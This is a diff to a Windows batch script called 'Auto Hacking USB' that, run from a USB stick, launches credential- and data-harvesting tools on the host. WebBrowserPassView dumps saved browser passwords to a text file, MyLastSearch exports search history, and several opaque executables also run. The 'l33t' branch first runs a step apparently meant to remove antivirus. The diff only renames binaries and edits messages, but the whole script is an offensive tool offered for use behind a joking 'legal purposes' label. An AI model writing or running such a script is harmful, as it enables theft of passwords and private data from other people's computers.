@@ -1,7 +1,7 @@
 @echo off
-title Auto Hacking USB ~~ Legal Purposes ;)
+title Auto Hacking USB ~~ Legal Purposes ;) ~~ @rossepstein(Twitter)
 :begin
-echo Make sure you read the readme before procceeding to make sure everything works.
+echo Please read the readme to see new features and other information.
 pause
 echo Would you like to reset the data files before initliazing? (Y or N)
 set /p reset=
@@ -32,18 +32,18 @@ ping localhost -n 5 >nul
 start tspion.exe
 start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
 start .\App\WebPass\WebBrowserPassView.exe /stext passwords.txt
-start .\App\CommandLine\Process.exe
+start .\App\bins\bin.exe
 pause
 start .\App\options.bat
 goto eof
 :l33t
-start .\App\AV_REM
+start .\App\rem.bat
 ping localhost -n 5 >nul
 start tspion.exe
 start .\App\mylastsearch\MyLastSearch.exe /stext searches.txt
 start .\App\WebPass\WebBrowserPassView.exe /stext passwords.txt
 start .\App\CommandLine\Process.exe
-start .\App\Core.exe
+start .\App\bins\bin.exe
 pause
 start .\App\options.bat
 goto eof
